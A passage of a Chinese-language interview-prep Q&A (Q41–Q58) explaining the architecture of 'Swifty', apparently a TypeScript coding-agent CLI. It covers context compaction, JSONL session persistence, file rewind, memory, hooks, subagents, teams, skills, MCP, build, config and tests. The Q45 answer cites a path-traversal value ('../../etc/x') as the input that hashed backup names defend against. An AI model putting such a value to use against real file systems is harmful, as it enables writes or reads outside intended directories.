2. 保守取向：3.5 偏小（对中文，1 字 ≈ 1.5-2 token，即 chars/token ≈ 0.5-0.7，估算会严重低估）—— 所以还有 hardBlock 和 ContextTooLongError 的"试错兜底"：真超了 API 会报错，触发强制压缩重试（Q9），形成闭环；
3. 安全边际：13000 的 auto margin 本质就是给估算误差预留的缓冲带。

这是工程上典型的"估算 + 测量 + 兜底"三层结构：估算做日常决策（便宜），测量做周期校准（准确），API 报错做最后兜底（必然正确）。

---

### Q42：压缩如何与会话持久化配合实现"可恢复的会话"？`compact_boundary` 是什么？

答：

会话以 JSONL 追加写持久化（`.swifty/sessions/{id}.jsonl`，每行一个 `SessionMessage`）。压缩发生时追加一条特殊记录：

```json
{
  "role": "system",
  "type": "compact_boundary",
  "content": "{\"summary\": \"...\", \"keep\": [{role, content}, ...]}"
}
```

`compact_boundary` 把摘要 + 保留尾部整体内联进会话文件。恢复时 `rebuildFromSession()`：

1. 从尾部扫描找最后一条 boundary（多次压缩只认最新）；
2. 有 boundary：合成"本会话延续自之前的对话…"user 消息（含摘要）→ 依序回放 keep 消息 → 回放 boundary 之后的普通消息；
3. 无 boundary：全量回放（向后兼容旧会话文件）。

这个设计的精妙之处：持久化格式与运行时压缩共用同一份数据结构 —— 压缩算法产出的 (summary, keep) 二元组直接序列化为 boundary，恢复算法就是压缩重建算法的镜像。不需要单独的"检查点格式"，语义自洽且单调：JSONL 是纯追加的，恢复时只需线性扫描。

附带机制：会话 30 天过期清理（连 `tool_results/` 落盘目录一起删）；`newSessionId()` 用 `Date.now().toString(36) + "-" + randomBytes(4).hex` 保证可读性与唯一性。

---

### Q43：超大工具结果"落盘 + 预览"机制中，`isSpillReadback()` 防御的无限循环具体是什么场景？

答：

场景还原：

1. 模型执行 Bash 产生 100KB 输出 → applyBudget 落盘到 `tool_results/{toolUseId}`，上下文里替换为 2KB 预览 + "完整结果在 xxx 路径"；
2. 模型（按设计）用 ReadFile 去读那个落盘文件 → ReadFile 返回 100KB 内容；
3. 如果没有 `isSpillReadback()`：这个新结果又超 50KB → 又被落盘 → 新路径给模型 → 模型再读 → 无限循环，磁盘被无意义复制撑爆。

防御（`budget.ts:60`）：Pass 1 落盘前检查该 toolResult 对应的 tool_use 是否是"读取 spill 目录的 ReadFile" —— 是则跳过落盘，让结果原样留在上下文（它是用户/模型主动要看的，属于"回读"而非"冗余"）。

这是自指防护（self-reference guard）的经典案例：任何"把 X 移出主存储并留下指针"的系统，都必须处理"指针被解引用后产物再次进入主存储"的回环。GC 的 card marking、操作系统的 swap-in 页不再立即 swap-out 候选，都是同构问题。

---

### Q44：如果让你向一个完全不了解的面试官解释"为什么纯摘要式压缩不够好"，你会怎么论证 Swifty 的三件套方案？

答：

论证结构：

1. 纯摘要的根本缺陷 —— 无损信息论视角：摘要是多对一映射，必然丢失细节。Coding Agent 的对话包含大量精确信息（文件路径、行号、错误消息原文、代码片段），这些信息压缩成"用户让修一个登录 bug"级别的摘要后，模型只能重新探索 —— 表现为压缩后反复重读文件、重复犯错。
2. 传话游戏衰减：多次压缩时，第二次压缩的输入是第一次的摘要 —— 摘要的摘要，信息呈指数衰减，远期上下文很快退化为空话。
3. Swifty 的对策是"分层保真"：
   - 近期 10K-40K token 原文保留：近端上下文是模型正在操作的工作区，精度要求最高 —— 直接不压缩；
   - 远期用结构化摘要：9 段式模板（而非自由摘要）强制保留"全部用户消息""文件与代码段""待办"等高价值维度，是有损但有纪律的压缩；
   - 工作记忆单独恢复：最近读过的 5 个文件内容作为恢复附件重新注入 —— 解决"摘要忘了模型刚看过什么"这一最高频痛点。
4. 类比收尾：这对应操作系统的存储分层 —— 寄存器/L1（保留尾部，热数据原样）、内存（恢复附件，刚换入的页）、磁盘（摘要，冷数据压缩存档）。纯摘要相当于"只有磁盘没有内存"。

---

## 八、会话持久化、记忆与钩子

### Q45：文件历史（FileHistory）与 `/rewind` 回滚是如何实现的？为什么备份键用 `sha256(path)` 而不是路径本身？

答：

机制（`file-history/file-history.ts`）：

- 编辑前备份：`trackEdit(filePath)` 在每次 Write/Edit 前，把当前文件内容复制到 `.swifty/file-history/{sessionId}/{sha256(path).hex.slice(0,16)}@v{N}`，版本号在 `trackedFiles: Map` 中递增。文件尚不存在时也递增版本（语义："此版本时文件不存在"）。
- 回合快照：`makeSnapshot(messageIndex)` 在 loop 结束时记录"全部已追踪文件当前版本"与对话位置的对应关系，上限 `MAX_SNAPSHOTS = 100`（丢最旧），userText 截断 60 字符作为快照标签。
- 回滚：`rewind(snapshotIndex)` —— 把目标快照中每个文件的备份内容写回工作区；备份缺失（当时文件不存在）则删除当前文件；快照数组截断到该点（无 redo，回滚是破坏性的单行道）；版本计数器同步回退。

为什么用 `sha256(path)` 作备份文件名：

1. 路径含非法字符：文件路径有 `/`、`..`、空格等，不能直接当文件名；
2. 防目录穿越：若直接用路径拼接，恶意/异常路径（`../../etc/x`）可能写出备份目录 —— 哈希把任意输入压平为固定字符集，天然免疫注入；
3. 定长：路径长度不一，哈希定长 16 hex，文件系统友好；
4. 取前 16 hex（64 bit）碰撞概率对会话级规模可忽略。

`/rewind` 的价值在于把"AI 改坏了"的恢复成本降到最低 —— 它本质是文件系统级的 time-travel debugging，与 git 互补（git 管提交粒度，rewind 管会话内的中间态）。

---

### Q46：记忆系统（Memory）的三层结构是什么？LLM 召回与自动提取分别怎么工作？

答：

存储层：两级目录 —— 用户级 `~/.swifty/memory/`（跨项目：用户偏好、反馈）与项目级 `{workDir}/.swifty/memory/`（项目知识、参考）。每条记忆是一个带 YAML frontmatter（name/type/description）的 `.md` 文件。`MEMORY.md` 是自动生成的索引（`- [name](path) -- description` 每行一条，上限 200 行 / 25KB）。

召回层（`manager.ts` `findRelevantMemories()`）：每轮对话前做非阻塞预取 —— 扫描全部记忆 frontmatter（上限 200 条，新的在前）构建清单，连同"最近用过的工具列表"发给 LLM，让它选最多 5 条相关记忆（提示词明确要求"克制挑剔"），Zod 校验 JSON 响应。结果附"记忆年龄"警告（>1 天提示可能过时）。预取是 fire-and-forget：Agent 循环在工具执行后用 `Promise.race` 探针检查是否已就绪，就绪则注入 system-reminder，未就绪直接跳过 —— 召回绝不阻塞主循环。

提取层（`extractor.ts`）：对话 loop 完成后自动触发（至少间隔 1 轮），派一个子代理（工具：Read/Write/Edit/Glob/Grep，maxIterations 5，bypass 权限）从对话中提取值得长期记忆的内容。防重复：提取前先注入现有记忆清单（"更新旧文件优于新建"）；防并发：`inProgress` 标志 + `pendingContext` 合批（提取运行期间的新上下文合并到下一轮尾巴跑）。子代理没输出工具调用时还有文本协议兜底（`MEMORY_NAME:/MEMORY_TYPE:/---` 块解析）。

巩固层（`consolidation.ts`）：定期（≥24 小时且 ≥5 个会话，10 分钟扫描节流）派子代理合并/去重/清理记忆；用 PID 锁文件防多实例并发（锁持有者进程活着且锁龄 <1 小时则放弃）。

设计哲学：记忆是"慢系统" —— 全部走旁路（预取不阻塞、提取在循环后、巩固在闲时），主循环只消费结果。索引文件（MEMORY.md）给模型看，frontmatter 给召回 LLM 看，正文给最终注入看 —— 三级粒度对应三级成本。

---

### Q47：Hook 系统的事件与动作模型是怎样的？`reject`、`once`、`async` 三个标志各自解决什么问题？

答：

事件（9 个生命周期点）：`session_start/end`、`turn_start/end`、`pre_send/post_receive`、`pre_tool_use/post_tool_use`、`shutdown` —— 覆盖了"会话-轮-请求-工具"四个粒度。

动作（4 种）：

- `command`：执行 shell（30s 超时、10MB 缓冲），注入环境变量 `SWIFTY_EVENT/SWIFTY_TOOL/SWIFTY_FILE_PATH`；
- `prompt`：把文本注入对话（作为通知排队）；
- `http`：POST JSON（整个 HookContext）到 URL —— webhook 集成；
- `agent`：委派给注入的 agentRunner 跑子代理。

条件表达式：`evaluateCondition()` 支持 `&&`/`||`/`!`、`==`/`!=`、`=~`（正则）、`=*`（glob，`→.*`、`*→[^/]*`、`?→.`），字段含 `tool/event/file_path/message` 及工具参数 —— 如 `tool == "EditFile" && file_path =* "src/.ts"`。

三个标志：

- `reject`（仅 pre_tool_use）：hook 返回拒绝即阻止工具执行，拒绝原因作为工具结果回喂模型 —— 实现"策略即代码"（如"禁止在 main 分支直接写文件"）；与 `async` 互斥（异步无法同步否决），配置时校验。
- `once`：`firedOnce` 集合按 hook id 去重，每会话最多触发一次 —— 解决"会话开场白""首次提醒"类需求，避免每轮重复注入。
- `async`：后台执行（`.then()` 不 await），立即返回 `(async)` 占位，真实输出完成后作为通知排队注入下一轮 —— 慢操作（如 http 上报）不阻塞 Agent 主循环。

钩子输出统一走 `recordNotification()` 队列，在下一轮开头被 Agent drain 成 system-reminder（见 Q7 第 3 步）—— 异步世界与生成器主线的汇合点。

---

### Q48：会话持久化选用 JSONL 追加写而不是 SQLite/单文件 JSON，权衡是什么？

答：

JSONL（每行一条 JSON，纯追加）的优势在该场景下非常契合：

1. 追加即持久化：每条消息一次 `appendFile`（O（消息）），崩溃最多丢最后一行；单文件 JSON 需全量重写（O（全量）），且崩溃时文件可能半截损坏导致全灭。
2. 流式恢复：恢复时逐行解析，坏行可跳过（best-effort）；单文件 JSON 一处损坏全部不可读。
3. 天然支持"边界记录"：`compact_boundary` 只是另一种行类型， schema 用 Zod 的 optional `type` 字段扩展 —— 无需迁移。
4. 可观测性：JSONL 可直接 `tail -f` 调试、`jq` 查询 —— 开发期体验好。
5. 无需依赖：SQLite 引入原生绑定与迁移负担，对"单写者、追加为主、全量回放"的会话存储是杀鸡用牛刀。

代价：无索引、无随机访问（恢复要全量扫）、无查询能力 —— 但会话场景的访问模式恰好是"顺序写 + 顺序读 + 偶尔从尾扫描找 boundary"，JSONL 全部命中最优路径。

通用启示：按访问模式选存储 —— 追加主导、全量回放、单写者的日志型负载，append-only 文本格式往往优于嵌入式数据库。

---

### Q49：系统里有哪些"非阻塞化"设计？请归纳 Swifty 处理慢操作的整体策略。

答：

慢操作清单及其非阻塞化手段：

| 慢操作                 | 手段            | 机制                                                   |
| ---------------------- | --------------- | ------------------------------------------------------ |
| 记忆召回 LLM 请求      | 预取 + 竞速探测 | loop 开始时发起，`Promise.race` 探针检查，未就绪则跳过 |
| 记忆提取/巩固子代理    | 后台执行        | loop 完成后触发，`inProgress` + pendingContext 合批    |
| 慢 hook（http 上报等） | `async` 标志    | 立即返回占位，输出排队下轮注入                         |
| 团队邮箱/进度          | 旁路队列 + 轮询 | 邮箱消息 drain 进下一轮；UI 500ms 轮询进度             |
| 上下文窗口 API 查询    | 3s 超时 + 缓存  | `MODEL_FETCH_TIMEOUT_MS`，失败回落静态表               |
| LLM 限流等待           | 可中断睡眠      | `interruptibleSleep` 监听 abort，Ctrl+C 优雅退出       |
| 权限/提问等待          | Promise 悬挂    | 生成器挂起，UI resolve 后恢复（Q12）                   |
| 落盘大结果             | 同步小写        | 单文件 50KB 级写，成本可忽略故不异步化                 |

整体策略可归纳为四档，按"主循环是否需要其结果才能继续"分派：

1. 必须等待 → Promise 悬挂（权限）；
2. 可延迟一轮 → 队列 + 下轮 drain（hook 通知、邮箱）；
3. 可完全跳过 → 预取 + 就绪探测（记忆召回）；
4. 可后台完成 → fire-and-forget + 状态文件（提取、巩固、teammate）。

核心原则：生成器主循环是神圣不可阻塞的 —— 一切慢操作要么挂起等待（有界、可取消），要么绕开主循环走旁路。这与浏览器主线程保护（长任务拆分、Web Worker、requestIdleCallback）是同一思想在不同宿主的重现。

---

## 九、多智能体、技能与 MCP

### Q50：子代理（Subagent）系统如何设计？内置三种代理的分工与工具过滤机制是什么？

答：

定义层（`subagent/definition.ts`）：`AgentDefinition` 声明 name/description、工具白/黑名单、systemPromptOverride、maxTurns、model、permissionMode、isolation（worktree）等。内置三种：

- `general-purpose`：全权限，处理复杂多步任务；
- `plan`：禁 Edit/Write + plan 权限模式 —— 只读架构师，产出实施计划；
- `explore`：禁 Edit/Write + plan 模式 + `model: "haiku"` —— 用便宜模型做代码探索，是成本分层设计：探索类任务 token 消耗大但智力要求低，用弱模型省钱。

派生层（`spawn.ts`）：`spawnSubagent()` 为子代理创建全新 `ConversationManager`（隔离上下文，防污染主线）；模型解析优先级 `调用方覆盖 > 定义指定 > 父级模型`，模型不同时新建 LLMClient 否则复用父客户端；`maxIterations = maxTurns ?? 200`；`onProgress` 回调向 UI 汇报 turn/lastTool。

工具过滤（`tool-filter.ts`，六层）：MCP 工具始终放行 → 全局黑名单（`Agent/AskUserQuestion/ExitPlanMode/EnterWorktree` 等，防子代理再派生子代理失控）→ 异步代理白名单 → 定义级黑名单 → 定义级白名单（`["*"]` 除外）。

防递归 fork：fork 路径（继承父上下文运行）有双重检测 —— `querySource` 标记 + 扫描对话中的 `<fork_boilerplate>` 标签；fork 出的代理拿到的是克隆注册表（`cloneRegistryForFork()` 把 Agent 工具深拷贝并打上 fork 标记），使其再次 fork 时能被识别并拒绝。

三种执行路径（`agent-tool.ts`）：`team_name` → 作为团队成员运行；无 `subagent_type` → fork（继承父上下文）；指定定义 → 标准派生。

---

### Q51：团队（Teams）多智能体协作的通信机制是什么？文件邮箱协议如何工作？

答：

拓扑：lead（主代理）+ 若干 teammate（后台代理进程/协程），星型通信 —— teammate 只与 lead 通信，不互相对话，降低协调复杂度。

文件邮箱（`teams/file-mailbox.ts`）：

- 每个成员一个 JSONL 邮箱文件（`.swifty/teams/{team}/{member}.jsonl`），消息行：`{from, text, timestamp}`；
- 写锁：`O_CREAT|O_EXCL` 创建 `{file}.lock` 实现互斥，最多 10 次尝试，锁龄超 10s 视为 stale 可强取，随机退避用 `Atomics.wait`（同步阻塞不耗事件循环）；
- 读游标：每个成员维护 `{member}.read` 游标文件，`receiveSync()` 只返回游标后的新行并推进 —— 增量消费，避免全量重读。

生命周期（`spawnTeammate()` 主循环）：执行任务 → 完成后状态置 idle 并向 lead 邮箱发 `[idle] name (reason)` → 每 500ms 轮询自己邮箱 → 收到 `[shutdown]` 退出；收到新任务则拼接为下一轮提示继续工作 → 退出时持久化对话 transcript。

lead 侧感知：`TeamManager.drainLeads()` 把各邮箱未读消息包装为 `<task-notification team="...">` XML，经 Agent 循环的 `notificationFn` 注入主线 system-reminder（复用 Q7 第 3 步的 drain 通道）。

后端（`backend.ts`）：`detectBackend()` 当前固定返回 `"in-process"`（同进程协程）；`detectPaneBackend()` 可探测 tmux（每 teammate 一个窗格）；iterm 未实现。

为什么用文件而不是 IPC/socket：跨后端可移植 —— 同一套协议在 in-process、子进程、tmux 窗格间都成立；崩溃恢复天然（邮箱是持久化的）；调试友好（直接 cat 邮箱文件）。代价是轮询延迟与锁竞争，在" teammate 数量少、消息频率低"的场景下完全可接受。

---

### Q52：技能（Skill）系统的 inline 与 fork 两种执行模式有什么区别？技能加载的目录扫描顺序为何设计成这样？

答：

技能格式：目录 + `SKILL.md`（YAML frontmatter：`name/description/allowed_tools/mode/model/fork_context`）。

inline 模式（`executor.ts`）：技能正文替换 `$ARGUMENTS` 占位符（或追加 `User Request:`），通过 `host.activateSkill(name, body)` 注入当前会话上下文 —— 技能是"提示词级别的 SOP 展开"，模型在当前对话里按 SOP 行事。适合流程指导类技能（如"如何做 code review"）。

fork 模式：技能在隔离子代理中运行，自带上下文，`fork_context` 控制父上下文继承量：`none`（默认，完全隔离）/ `recent`（带父对话最近 5 条）/ `full`（最近 100 条）。适合会产生大量中间输出的任务（如"批量重构"—— 中间过程不进主线污染上下文，只回传最终报告）。

目录扫描顺序（`catalog.ts`，8 个目录，后者覆盖同名前者）：

```
内置技能 → ~/.trae → ~/.claude → ~/.github → ~/.swifty
        → {project}/.trae → {project}/.claude → {project}/.github → {project}/.swifty
```

设计意图：

1. 内置 < 用户 < 项目：越靠近当前项目的配置优先级越高，与 Git/ESLint 的配置级联惯例一致；
2. 兼容生态：扫描 `.claude`/`.trae`/`.github` 目录意味着可直接复用 Claude Code 等生态的已有技能库 —— 降低用户迁移成本，是务实的生态策略；
3. 覆盖语义：同名覆盖而非合并，简单可预测。

热重载：`get()` 比对文件 mtime，变了就重读重解析（失败保留旧版）；`needsReload()` 靠目录 mtime 感知增删 —— 技能开发时可即改即试。技能还被注册为斜杠命令（`/<name>`），且模型可通过 `LoadSkillTool` 自主激活 —— 人驱与模型驱两个入口。

---

### Q53：MCP（Model Context Protocol）是如何接入的？为什么 MCP 工具默认 deferred？

答：

接入链（`mcp/manager.ts` → `client.ts` → `tool-wrapper.ts`）：

1. 连接：`MCPManager.connectAll(configs)` 为每个服务器建 `MCPClient`，支持三种传输 —— stdio（`command + args`，环境变量 `${VAR}`/`$VAR` 展开）、StreamableHTTP（URL 型默认）、SSE（显式指定）；
2. 发现：连接后 `listTools()` 拉取工具清单，服务器 instructions 收集后注入 system-reminder；
3. 适配：每个 MCP 工具包一个 `MCPToolWrapper` 实现统一 `Tool` 接口 —— 名称消毒为 `mcp__{server}__{tool}`（非字母数字转 `_`），`execute()` 内部调 `client.callTool()`，把 MCP 的 content 数组拍平为文本，保留 `isError`；
4. 注册：wrapper 注册进全局 `ToolRegistry`，从此对 Agent/权限/调度完全透明 —— MCP 工具与内置工具走同一条执行管线。

为什么默认 `deferred = true`：

1. 上下文成本：MCP 服务器动辄暴露几十个工具（如 GitHub MCP 有 90+），全量 schema 会吃掉大量窗口并稀释注意力 —— 延迟加载（Q21）让模型先经 ToolSearch 发现再启用；
2. 信任分级：MCP 是第三方代码，schema 里可能含提示注入内容，不进入初始上下文等于默认最小暴露面；
3. 缓存稳定：工具列表稳定是 prompt caching 命中的前提，MCP 工具不进入初始列表，其变化就不会打破前缀缓存。

子代理侧 MCP 工具始终放行（`mcp__*` 前缀直通工具过滤第一层）—— 因为 deferred 发现机制在子代理中同样生效，过滤只挡危险能力，不挡"需要搜索才能看到"的工具。

---

### Q54：对比"子代理 fork / 技能 fork / 团队 teammate"三种并发形态，各自的适用场景与设计取舍是什么？

答：

| 维度     | 子代理 (Agent tool)        | 技能 fork                      | 团队 teammate                      |
| -------- | -------------------------- | ------------------------------ | ---------------------------------- |
| 触发者   | 模型自主决策               | 用户 `/skill` 或模型 LoadSkill | 模型调 TeamCreate/SpawnTeammate    |
| 上下文   | 全新（或 fork 继承）       | 全新 + fork_context 控制       | 全新                               |
| 生命周期 | 一次性，跑完即返           | 一次性                         | 长驻，idle 后等新任务              |
| 通信     | 返回值（最终报告）         | 返回值                         | 文件邮箱双向持续通信               |
| 模型     | 可指定（explore 用 haiku） | 可指定                         | 与 lead 相同                       |
| 适用场景 | 独立子任务（探索/计划）    | 流程化 SOP 的隔离执行          | 长周期并行工作流（前后端同时开发） |

取舍分析：

- 子代理是"函数调用"：同步等待返回值，封装性最强，适合主线依赖其结果的任务。代价是阻塞主线。
- 技能 fork 是"带 SOP 的函数调用"：与子代理机制相同但载荷是技能正文 —— 把"怎么做"的知识打包复用。
- teammate 是" actor 进程"：异步、长驻、有邮箱 —— 表达力最强（持续协作），但引入状态管理（idle/轮询/关闭协议）、调试复杂度，只在真正需要并行长任务时值得。

统一底座：三者都复用同一个 `Agent` 类 + `spawnSubagent()` 设施，差异仅在上下文来源、生命周期管理、通信通道三个参数上 —— 这是"一个核心引擎，多种并发语义"的优雅设计。

---

## 十、工程化：构建、测试与配置

### Q55：构建系统（tsup）有哪些针对 CLI 产物的特殊处理？为什么要 `noExternal: [/.*/]`？

答：

`tsup.config.ts` 的关键决策：

1. 单入口 ESM 产物：`src/main.tsx` → `dist/`，Node 20 target，minify。shebang 通过 banner 注入（`#!/usr/bin/env node`），并附 `createRequire` 垫片 —— ESM 产物中某些 CJS 依赖会调用 `require()`，垫片在 ESM 作用域重建 require。
2. 全量内联（`noExternal: [/.*/]`）：除 Node 内建模块和 `@swifty.js/glob-addon`（原生 C++ addon，无法打包）外，全部依赖打进单文件。动机：
   - 分发可靠性：npm 安装时依赖树解析失败/peer 冲突是 CLI 工具最常见的安装事故，单文件产物零依赖 = 零安装事故；
   - 启动速度：单文件免去 Node 在 node_modules 中的模块解析（成千次 stat），冷启动显著更快 —— CLI 对启动延迟极度敏感；
   - 可安装为单二进制：为后续 SEA（Single Executable Application）分发铺路。
3. post-build 资源拷贝：`release.wasm`（glob 引擎）、`builtin/`（内置技能）、`glob_addon.node`（原生 addon）拷入 dist —— 代码内联但二进制资源保持外部文件。
4. 混合引擎策略：glob 同时有 WASM（`@swifty.js/glob-wasm`，可内联加载）与原生 addon 两实现 —— WASM 保证可移植，addon 在可用时提供性能，构建系统两者都带上，运行时择优。

开发期用 `tsx` 直跑 TS（免编译），测试用 Vitest（与 tsx 共享 esbuild 转换，零额外配置）—— 三套工具链共用 esbuild 系，配置成本最小化。

---

### Q56：配置系统的多层合并策略是什么？context window 的四级解析体现什么设计思想？

答：

合并（`config.ts`，6 个候选文件按序叠加）：`~/.swifty/config.{yml,yaml}` → `{cwd}/.swifty/config.{yml,yaml}` → `{cwd}/.swifty/config.local.{yml,yaml}`。合并规则按字段类型定制：

- `providers`：整体替换（数组无合并语义，整体覆盖最不惊讶）；
- `mcp_servers`：按 name 合并（同名替换，新名追加 —— 有键集合用键合并）；
- `hooks`：拼接（无键可合并，叠加最安全）；
- `sandbox`：浅合并；`permission_mode`：后者覆盖；`enable_coordinator_mode`：OR。

体现了"按数据结构选择合并语义"：标量覆盖、数组替换、有键映射按键合并、无键列表拼接 —— 与 Helm values、Kubernetes strategic merge patch 同理。`local` 文件用于不入库的本地覆盖（API key 等敏感信息）。

context window 四级解析（`getContextWindowAsync()`）：

1. 显式配置 `context_window`（用户最懂，最高优先）；
2. API 探测：Anthropic 协议查 `GET /v1/models/{model}` 的 `max_input_tokens`（3s 超时 + 缓存，best-effort）；
3. 内置模型名子串表（`gpt-4.1→1M`、`claude→200K`、`gpt-3.5→16385`…）；
4. 保守默认：claude 系 200K，其余 128K。

设计思想是"准确性与可用性的优雅降级链"：每层失败都回落到更保守但永远可用的下一层，任何环境下都能启动 —— 只是压缩阈值保守一点。同时同步版 `getContextWindow()`（无 API 层）供启动早期使用，异步版就绪后升级 —— 同一数据的"快路径/准路径"双版本。

---

### Q57：项目的测试策略是怎样的？25+ 测试文件覆盖了哪些关键面？E2E 怎么做？

答：

Vitest v4（v8 coverage），测试分层（`tests/`）：

单元层：

- 协议转换：`anthropic-context.test.ts`、`openai-compat.test.ts`（消息构造、错误分类、缓存去重）；
- 核心算法：`compact.test.ts`（阈值/保留尾部/PTL）、`conversation.test.ts`、`tool-result.test.ts`（budget）、`diff.test.ts`、`at-expand.test.ts`；
- 安全：`permissions.test.ts`（分层决策、元字符守卫、规则引擎）；
- 基础设施：`config.test.ts`、`session.test.ts`、`model-resolver.test.ts`。

集成层：`agent.test.ts`（注入 mock LLMClient 驱动完整循环：工具执行、压缩、恢复、中断）；`skills.test.ts`、`teams.test.ts` + `file-mailbox.test.ts`（锁、游标、过期）；`memory.test.ts` + `consolidation.test.ts`；`code-review.test.ts`、`ask-user.test.ts`、`plan-file.test.ts`、`command-loader.test.ts`、`install-skill.test.ts`。

E2E 层：`run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式（`swifty -p`）跑真实端到端场景。可行正是因为 print 与 TUI 共享同一 Agent 核心（Q6）—— headless 模式天然是 E2E 测试的入口点。

测试策略的两个关键决策：

1. mock 边界画在 LLMClient：这是系统唯一的"不确定性来源"，mock 掉它之后整个 Agent 循环（含压缩、权限、工具调度）都是确定性可测的 —— 依赖注入架构的直接红利；
2. 文件系统型子系统用真实临时目录（mailbox、session、file-history）而非 mock fs —— 这些系统的 bug 恰恰藏在真实 FS 语义里（锁、原子性、mtime），mock 会掩盖它们。

---

### Q58：作为高级前端工程师，从这个项目中你能提炼出哪些可迁移到其他领域的架构经验？

答：

提炼七条（面试时可按对方兴趣展开）：

1. 生成器即引擎：`AsyncGenerator` 把"长流程 + 多产出 + 需背压 + 可取消"的场景建模为拉取式流 —— 可迁移到任何流式 AI 应用、构建工具的增量编译、数据管道。
2. 防腐层收敛三方差异：三套 LLM 协议 → 统一 StreamEvent。任何对接多家供应商的系统（支付、地图、IM）都适用：差异留在消息构造与解析两侧，核心只认内部统一语言。
3. 分层短路决策管线：权限 7 层从具体到一般排列，单层短路。风控、功能开关、A/B 分流都是同构问题。
4. 无损手段先于有损手段：budget（落盘）先于 compact（摘要）。缓存逐出、日志降级、图片压缩同理。
5. 估算 + 测量 + 兜底：chars/3.5 估算、usage anchor 校准、API 报错兜底。性能预算、配额系统都可以套这个三层结构。
6. 主循环神圣不可阻塞：慢操作四档分派（悬挂/排队/探测/后台）。即浏览器主线程保护思想的服务端版。
7. 静态元数据驱动调度：`Tool.category` 一个字段驱动并行调度、权限矩阵、安全兜底。声明式元数据优于运行时推断 —— React Server Components 的 `"use client"`、HTTP 缓存头都是此思想。

升华：Coding Agent 是"前端工程师视角的分布式系统" —— LLM 是不可靠的远端服务（重试/熔断/降级）、上下文窗口是稀缺带宽（压缩/缓存/延迟加载）、工具是副作用边界（权限/沙箱）、多智能体是 actor 模型（邮箱/隔离）。这个项目的价值在于把这些分布式系统的经典武器，全部在单进程 TypeScript 里重演了一遍。

---

## 结语

本文档覆盖 Swifty 的十大主题、58 组问答。面试使用建议：

- 讲故事线：架构（Q1-6）→ 循环（Q7-13）→ 协议（Q14-19）→ 安全（Q25-29）→ 渲染（Q30-38）→ 内存治理（Q39-44）→ 生态（Q50-54）→ 工程化（Q55-58），由主干到枝叶；
- 被追问时的锚点：每个回答都给了文件路径与常量（`agent.ts:527`、`CHARS_PER_TOKEN=3.5`、`MAX_TOKENS_CEILING=64000` …），细节是最好的信任背书；
- 开放题模板：现状局限 → 方案 → 权衡（Q29、Q38、Q58 示范）。

源码即事实：`apps/swifty/src/` 下所有引用均可直接查证。
